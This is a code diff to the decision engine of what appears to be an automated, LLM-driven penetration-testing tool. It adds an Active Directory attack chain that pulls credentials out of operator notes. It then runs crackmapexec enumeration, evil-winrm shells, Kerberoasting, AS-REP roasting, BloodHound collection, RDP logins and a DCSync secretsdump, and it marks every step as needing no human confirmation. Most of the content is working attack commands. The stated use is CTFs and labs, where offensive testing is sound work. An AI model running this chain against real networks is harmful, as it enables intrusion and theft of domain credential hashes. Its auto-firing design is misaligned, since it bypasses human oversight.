@@ -181,7 +181,26 @@ class DecisionEngine:
         """
         target = intel.get("target", "")
 
-        # ── Phase 0 (Recommendation E): Foothold primers force-promoted ────
+        # ── Phase 0a: Credentialed-AD primer (HIGHEST priority) ────────────
+        # When operator notes contain valid AD credentials AND the target has
+        # AD-style ports open (445/5985/3389/389), fire the deterministic
+        # creds-in-hand chain ahead of everything else.  This is the single
+        # most-impactful primer: a 30-second path from `user:pass` to an
+        # interactive shell on a domain-joined Windows host.
+        ad_primer = self._next_credentialed_ad_primer(
+            intel           = intel,
+            target          = target,
+            used_tools      = used_tools,
+            negative_memory = negative_memory,
+        )
+        if ad_primer is not None:
+            await self._emit_reasoning(
+                f"[ad-primer] credentialed AD step: {ad_primer.tool} "
+                f"→ {ad_primer.target_service} ({ad_primer.reason[:80]})"
+            )
+            return ad_primer
+
+        # ── Phase 0b (Recommendation E): Foothold primers force-promoted ────
         # If an open service has a registered cheap-unauth primer chain
         # (FTP anon, telnet default-creds, SNMP public, SMB null-session,
         # DB default-creds, redis unauth) that has NOT yet been tried this
@@ -524,6 +543,388 @@ class DecisionEngine:
             "bloodhound-python": f"ldap:389",
         }
         return tool_service.get(tool, f"{tool}:{target}")
+
+    # ── Credentialed-AD primer (Windows post-creds chain) ────────────────
+    # When the operator pastes valid AD creds in `notes` / `scope`, we fire
+    # this deterministic chain ahead of any LLM planning.  The chain is
+    # ordered cheapest-to-shell so the platform reaches a real foothold in
+    # under a minute on most CTF/lab/internal-AD scenarios.
+    #
+    # Each entry produces a single command using the placeholders:
+    #   {target}, {user}, {pass}, {domain}, {dc_ip}, {base_dn}
+    # The domain / base_dn are looked up from intel and fall back to the
+    # short-circuit "unknown" so the LLM can repair them in next iteration.
+    _CRED_AD_PRIMERS: List[Dict[str, Any]] = [
+        # 1. Validate creds via SMB (always step #1 — confirms cred + DC reachable)
+        {"chain": "ad_creds_validate_smb", "ports": ["445"],
+         "tool": "crackmapexec",
+         "args": "smb {target} -u '{user}' -p '{pass}'",
+         "service_label": "smb:445",
+         "rationale": "validate provided AD credentials before any heavier action"},
+        # 2. Enumerate shares + users + groups + pass policy
+        {"chain": "ad_creds_enum_smb", "ports": ["445"],
+         "tool": "crackmapexec",
+         "args": "smb {target} -u '{user}' -p '{pass}' --shares --users --groups --pass-pol --rid-brute 4000",
+         "service_label": "smb:445",
+         "rationale": "enumerate AD with creds — shares, users, groups, RID brute"},
+        # 3. Check WinRM access (5985 → likely instant shell)
+        {"chain": "ad_creds_winrm_check", "ports": ["5985"],
+         "tool": "crackmapexec",
+         "args": "winrm {target} -u '{user}' -p '{pass}'",
+         "service_label": "winrm:5985",
+         "rationale": "check WinRM — `Pwn3d!` line means evil-winrm gives instant shell"},
+        # 4. evil-winrm interactive shell (when WinRM open)
+        # NOTE: this command runs in interactive mode; the executor wraps it
+        # with a timeout/script.  When success regex hits, register_shell()
+        # fires.
+        {"chain": "ad_creds_winrm_shell", "ports": ["5985"],
+         "tool": "evil-winrm",
+         "args": "-i {target} -u '{user}' -p '{pass}'",
+         "service_label": "winrm:5985",
+         "rationale": "WinRM interactive shell with valid creds — direct foothold"},
+        # 5. Kerberoasting (collect TGS hashes for offline cracking)
+        {"chain": "ad_creds_kerberoast", "ports": ["88"],
+         "tool": "impacket-GetUserSPNs",
+         "args": "{domain}/{user}:'{pass}' -dc-ip {target} -request -outputfile /tmp/kerberoast.{target}.txt",
+         "service_label": "kerberos:88",
+         "rationale": "kerberoast — request TGS for service accounts, crack offline"},
+        # 6. AS-REP roasting (no-preauth users)
+        {"chain": "ad_creds_asreproast", "ports": ["88"],
+         "tool": "impacket-GetNPUsers",
+         "args": "{domain}/{user}:'{pass}' -dc-ip {target} -request -outputfile /tmp/asreproast.{target}.txt",
+         "service_label": "kerberos:88",
+         "rationale": "AS-REP roast — find users with DONT_REQ_PREAUTH"},
+        # 7. LDAP search with correct base DN (fixes the j.arbuckle/j.arbuckle bug)
+        {"chain": "ad_creds_ldap_userinfo", "ports": ["389"],
+         "tool": "ldapsearch",
+         "args": "-H ldap://{target} -x -D '{user}@{domain}' -w '{pass}' -b '{base_dn}' '(sAMAccountName={user})'",
+         "service_label": "ldap:389",
+         "rationale": "fetch caller's AD object — group membership, ACL targets"},
+        # 8. Full BloodHound collection
+        {"chain": "ad_creds_bloodhound", "ports": ["389"],
+         "tool": "bloodhound-python",
+         "args": "-d {domain} -u '{user}' -p '{pass}' -ns {target} -c All --zip",
+         "service_label": "ldap:389",
+         "rationale": "full AD attack-graph collection for offline path analysis"},
+        # 9. RDP try (3389 — many lab boxes accept the same creds)
+        {"chain": "ad_creds_rdp_try", "ports": ["3389"],
+         "tool": "xfreerdp",
+         "args": "/v:{target} /u:{user} /p:'{pass}' /cert:ignore /size:1024x768 +clipboard",
+         "service_label": "rdp:3389",
+         "rationale": "RDP with valid creds — interactive Windows desktop session"},
+        # 10. SecretsDump (DCSync if user has rights — last because heaviest)
+        {"chain": "ad_creds_secretsdump_try", "ports": ["445"],
+         "tool": "impacket-secretsdump",
+         "args": "{domain}/{user}:'{pass}'@{target} -just-dc-ntlm",
+         "service_label": "smb:445",
+         "rationale": "DCSync attempt — gives every NT hash if user has GetChanges rights"},
+    ]
+
+    # Regex set for credential extraction from operator_notes free text.
+    # Compiled lazily.
+    _CRED_PATTERNS = None
+
+    @classmethod
+    def _compile_cred_patterns(cls):
+        if cls._CRED_PATTERNS is not None:
+            return cls._CRED_PATTERNS
+        import re
+        # All patterns require the password to contain at least one digit OR
+        # one special character — this rules out dictionary-word false positives
+        # like "no creds yet, just scope ..." matching as user='yet' pass='just'.
+        # Real AD passwords almost always have complexity, so this is safe.
+        _PWD = r"(?P<pwd>(?=[^\s'\"]*[0-9!@#$%^&*+=_?,.~/\\|:;<>{}\[\]()-])[^\s'\"]{4,})"
+        cls._CRED_PATTERNS = [
+            # 1. DOMAIN\user:pass   or   DOMAIN/user:pass
+            re.compile(rf"(?P<domain>[A-Za-z0-9_.-]+)[\\/](?P<user>[A-Za-z0-9_.-]+)\s*:\s*['\"]?{_PWD}['\"]?"),
+            # 2. user@domain.tld:pass
+            re.compile(rf"(?P<user>[A-Za-z0-9_.-]+)@(?P<domain>[A-Za-z0-9_.-]+\.[A-Za-z0-9_.-]+)\s*:\s*['\"]?{_PWD}['\"]?"),
+            # 3. Explicit user/username + password keys on the same line/note
+            re.compile(rf"\b(?:user(?:name)?|login)\s*[:=]\s*['\"]?(?P<user>[A-Za-z0-9_.-]+)['\"]?[\s,;]+(?:pass(?:word)?|pwd)\s*[:=]\s*['\"]?{_PWD}['\"]?", re.I),
+            # 4. creds: user / pass   or   credentials = user|pass
+            re.compile(rf"\b(?:creds?|credentials?)\s*[:=]?\s+['\"]?(?P<user>[A-Za-z0-9_.-]+)['\"]?\s*[/|]\s*['\"]?{_PWD}['\"]?", re.I),
+            # 5. bare user:pass — only when surrounded by whitespace / boundary
+            re.compile(rf"(?:^|\s|[\(\[\"'`])(?P<user>[A-Za-z][A-Za-z0-9_.-]{{1,30}}):{_PWD}(?:\s|$|[\)\]\"'`])"),
+        ]
+        return cls._CRED_PATTERNS
+
+    @classmethod
+    def _extract_credentials(cls, intel: dict) -> Optional[Dict[str, str]]:
+        """Pull the first valid (user, password, domain) triple from
+        operator_notes.  Returns None if no creds detected.
+
+        domain falls back to whatever the recon phase has discovered
+        (rdp-ntlm-info, smb-os-discovery, ldap rootDSE) — see
+        _resolve_ad_domain.  base_dn is computed from domain.
+        """
+        notes = intel.get("operator_notes") or []
+        if not notes:
+            return None
+
+        # Concatenate all note text so a multi-line note still matches.
+        blob = "\n".join(
+            (n.get("note") if isinstance(n, dict) else str(n)) or ""
+            for n in notes
+        )
+        if not blob.strip():
+            return None
+
+        for pat in cls._compile_cred_patterns():
+            m = pat.search(blob)
+            if not m:
+                continue
+            gd = m.groupdict()
+            user = (gd.get("user") or "").strip()
+            pwd  = (gd.get("pwd")  or "").strip()
+            dom  = (gd.get("domain") or "").strip()
+            # Reject obvious non-creds: empty, http URL fragments, key:value where
+            # the "value" is itself a URL or numeric port.
+            if not user or not pwd:
+                continue
+            if user.lower() in ("http", "https", "ftp", "smb", "ssh", "tcp", "udp"):
+                continue
+            if pwd.startswith(("http", "//", "tcp", "udp")) or pwd.isdigit():
+                continue
+            if len(pwd) < 4:
+                continue
+            return {"user": user, "pass": pwd, "domain": dom or ""}
+
+        return None
+
+    # Compiled patterns that recognise an AD DNS domain in tool output.
+    # Order matters — DNS-style names beat NetBIOS short names because
+    # the DNS form gives us a usable base DN (dc=corp,dc=local).
+    _DOMAIN_OUTPUT_PATTERNS = None
+
+    @classmethod
+    def _compile_domain_patterns(cls):
+        if cls._DOMAIN_OUTPUT_PATTERNS is not None:
+            return cls._DOMAIN_OUTPUT_PATTERNS
+        import re
+        cls._DOMAIN_OUTPUT_PATTERNS = [
+            # rdp-ntlm-info / smb-os-discovery NSE script line
+            (re.compile(r"DNS_Domain_Name:\s*([A-Za-z0-9._-]+\.[A-Za-z]{2,})"), 0.99),
+            # crackmapexec / netexec banner: (domain:garfield.htb)
+            (re.compile(r"\(domain:\s*([A-Za-z0-9._-]+\.[A-Za-z]{2,})\)", re.I), 0.99),
+            # ldapsearch / dnsrecon style: dc=garfield,dc=htb  →  garfield.htb
+            (re.compile(r"\bdc=([A-Za-z0-9_-]+)(?:\s*,\s*dc=([A-Za-z0-9_-]+))+", re.I), 0.95),
+            # Active Directory LDAP: Microsoft Windows Active Directory LDAP (Domain: garfield.htb)
+            (re.compile(r"Active Directory LDAP\s*\(Domain:\s*([A-Za-z0-9._-]+\.[A-Za-z]{2,})", re.I), 0.99),
+            # FQDN of the DC itself (DNS_Computer_Name field)
+            (re.compile(r"DNS_Computer_Name:\s*[A-Za-z0-9_-]+\.([A-Za-z0-9._-]+\.[A-Za-z]{2,})"), 0.95),
+            # Generic "Domain Controller for <domain>"
+            (re.compile(r"[Dd]omain[\s_-]?[Cc]ontroller[^\n]{0,40}?([A-Za-z0-9_-]+\.[A-Za-z]{2,})"), 0.85),
+            # smb-os-discovery: Computer name: dc01.garfield.htb
+            (re.compile(r"Computer name:\s*[A-Za-z0-9_-]+\.([A-Za-z0-9._-]+\.[A-Za-z]{2,})"), 0.90),
+        ]
+        return cls._DOMAIN_OUTPUT_PATTERNS
+
+    @classmethod
+    def _scan_raw_outputs_for_domain(cls, intel: dict) -> str:
+        """Walk every blob in intel['raw_outputs'] and return the first
+        confidently-matched AD DNS domain.  Empty string if none.
+
+        Cheap regex sweep — runs only when the primer needs a domain and
+        intel['domain'] / intel['ad'] haven't been populated yet by other
+        extractors.
+        """
+        raw = intel.get("raw_outputs") or {}
+        if not isinstance(raw, dict):
+            return ""
+
+        # Concatenate all blobs (capped to keep the regex cheap).
+        # Raw outputs can be large; we only need the headers/banners.
+        blobs: List[str] = []
+        for tool_name, blob in raw.items():
+            if not blob:
+                continue
+            text = blob if isinstance(blob, str) else str(blob)
+            blobs.append(text[:8000])
+        if not blobs:
+            return ""
+        all_text = "\n".join(blobs)
+
+        for pat, _conf in cls._compile_domain_patterns():
+            m = pat.search(all_text)
+            if not m:
+                continue
+            # dc=foo,dc=bar pattern needs assembly from all groups
+            if "dc=" in pat.pattern.lower():
+                # Re-extract every dc=XXX component in order
+                import re
+                comps = re.findall(r"dc=([A-Za-z0-9_-]+)", m.group(0), re.I)
+                if len(comps) >= 2:
+                    return ".".join(comps).lower()
+                continue
+            cand = (m.group(1) or "").strip().lower()
+            # Reject obvious garbage: very short, all-numeric, or template literal
+            if cand and "." in cand and len(cand) >= 4 and not cand[0].isdigit():
+                return cand
+        return ""
+
+    @classmethod
+    def _resolve_ad_domain(cls, intel: dict, fallback: str = "") -> str:
+        """Find the AD DNS domain from any source the recon phase has
+        populated.  Priority:
+          1. intel['domain']  (already-merged structured field)
+          2. intel['ad']['dns_domain']  (set by primer's own auto-stamp)
+          3. intel['services'][*]['domain']
+          4. Live regex sweep over intel['raw_outputs']  ← new: catches
+             rdp-ntlm-info, crackmapexec banner, ldap rootDSE, etc.
+          5. fallback (often blank)
+
+        When the regex sweep finds a domain, it stamps intel['domain'] and
+        intel['ad']['dns_domain'] so subsequent calls and other components
+        get O(1) lookup without re-scanning raw outputs.
+        """
+        d = (intel.get("domain") or "").strip()
+        if d:
+            return d
+        ad = intel.get("ad") or {}
+        if isinstance(ad, dict):
+            d = (ad.get("dns_domain") or ad.get("domain") or "").strip()
+            if d:
+                return d
+        services = intel.get("services") or {}
+        if isinstance(services, dict):
+            services_iter = services.values()
+        else:
+            services_iter = services
+        for svc in services_iter:
+            if not isinstance(svc, dict):
+                continue
+            d = (svc.get("domain") or svc.get("dns_domain") or "").strip()
+            if d:
+                return d
+        # Live sweep
+        d = cls._scan_raw_outputs_for_domain(intel)
+        if d:
+            intel["domain"] = d
+            intel.setdefault("ad", {})["dns_domain"] = d
+            return d
+        return fallback
+
+    @staticmethod
+    def _domain_to_base_dn(domain: str) -> str:
+        """garfield.htb → DC=garfield,DC=htb."""
+        if not domain:
+            return ""
+        parts = [p for p in domain.split(".") if p]
+        return ",".join(f"DC={p}" for p in parts)
+
+    def _next_credentialed_ad_primer(
+        self,
+        *, intel:           dict,
+        target:             str,
+        used_tools:         Dict[str, int],
+        negative_memory:    NegativeMemory,
+    ) -> Optional[JustifiedAction]:
+        """Return the next credentialed-AD primer step that has not yet
+        fired and whose required port is open.  None when:
+          - no creds in operator_notes, OR
+          - none of the AD primer ports are open, OR
+          - every applicable primer step has already fired this session.
+        """
+        creds = self._extract_credentials(intel)
+        if not creds:
+            return None
+
+        # Open ports — same parsing as unauth primer
+        open_ports: set = set()
+        for p in (intel.get("open_ports") or []):
+            if isinstance(p, dict):
+                pp = p.get("port")
+                if pp is not None:
+                    open_ports.add(str(pp))
+            else:
+                open_ports.add(str(p).split("/")[0])
+
+        if not open_ports:
+            return None
+
+        # Resolve domain (and re-stamp creds.domain so subsequent steps reuse it)
+        domain = creds.get("domain") or self._resolve_ad_domain(intel)
+        if domain and not creds.get("domain"):
+            creds["domain"] = domain
+        base_dn = self._domain_to_base_dn(domain)
+
+        # Track fired per-session
+        fired = intel.setdefault("_cred_ad_primers_fired", set())
+        if isinstance(fired, list):
+            fired = set(fired)
+            intel["_cred_ad_primers_fired"] = fired
+
+        # Stash the parsed creds on intel so other components (extractors,
+        # post-ex agents) can read them without re-parsing notes.
+        intel.setdefault("ad", {}).update({
+            "user":     creds.get("user", ""),
+            "password": creds.get("pass", ""),
+            "dns_domain": domain,
+            "base_dn":  base_dn,
+        })
+
+        for primer in self._CRED_AD_PRIMERS:
+            # Need at least one of the listed ports open
+            if not (set(primer["ports"]) & open_ports):
+                continue
+            primer_key = primer["chain"]
+            if primer_key in fired:
+                continue
+            tool = primer["tool"]
+            svc  = primer["service_label"]
+
+            # Skip if domain-required step but we couldn't resolve a domain.
+            # The args template uses {domain} and {base_dn} — if they're
+            # blank the command would be malformed; defer until a future
+            # iteration when domain has been discovered.
+            if "{domain}" in primer["args"] and not domain:
+                continue
+            if "{base_dn}" in primer["args"] and not base_dn:
+                continue
+
+            try:
+                args_filled = primer["args"].format(
+                    target  = target,
+                    user    = creds["user"],
+                    **{"pass": creds["pass"]},
+                    domain  = domain,
+                    dc_ip   = target,
+                    base_dn = base_dn,
+                )
+            except Exception:
+                continue
+
+            # Negative-memory check — if this exact (tool, service, args) failed
+            # already, mark fired and move on.
+            if negative_memory.has_failed_before(tool, svc, args=args_filled):
+                fired.add(primer_key)
+                continue
+
+            fired.add(primer_key)
+
+            return JustifiedAction(
+                action_id            = f"ad-primer-{primer_key}",
+                tool                 = tool,
+                args                 = args_filled,
+                target_service       = svc,
+                reason               = (
+                    f"[AD-Primer/{primer_key}] credentialed AD step — "
+                    f"{primer['rationale']}"
+                ),
+                expected_outcome = (
+                    "Successful authentication / shell / hash dump — "
+                    "or definitive 'access denied' to flag this primer dead."
+                ),
+                success_criteria = (
+                    "Tool exits 0 with `+` / `Pwn3d!` / non-empty hash output. "
+                    "On WinRM, `evil-winrm` reaching the prompt is a foothold."
+                ),
+                hypothesis_id        = "ad-primer",
+                confidence           = 0.92,
+                requires_confirmation= False,
+            )
+
+        return None
 
     # ── Recommendation E: foothold-primer auto-promotion ──────────────────
 
